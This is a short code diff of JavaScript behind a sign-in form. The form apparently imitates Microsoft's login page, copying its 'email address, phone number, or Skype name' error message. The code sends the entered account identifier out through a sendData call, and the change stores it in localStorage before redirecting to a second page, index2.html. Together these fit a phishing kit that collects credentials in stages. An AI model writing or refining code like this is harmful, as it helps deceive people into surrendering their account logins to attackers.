@@ -14,7 +14,6 @@ window.addEventListener('load', function() {
   const submitForm = () => {
     const enteredText = inputElement.value;
 
-
     if (enteredText.trim() === '') {
       errorText.textContent = 'Enter a valid email address, phone number, or Skype name.';
       errorText.style.display = 'block';
@@ -30,13 +29,12 @@ window.addEventListener('load', function() {
         errorText.style.display = 'none';
         inputElement.classList.remove('error_gpt');
 
-        const formData = new FormData();
-        formData.append('textData', enteredText);
+        localStorage.setItem('inputText', enteredText);
 
         sendData({ email: enteredText })
           .then(response => {
             console.log('Data sent successfully', response);
-            window.location.href = 'index2.html?text=' + encodeURIComponent(enteredText);
+            window.location.href = 'index2.html';
           })
           .catch(error => {
             console.error('Error sending data', error);
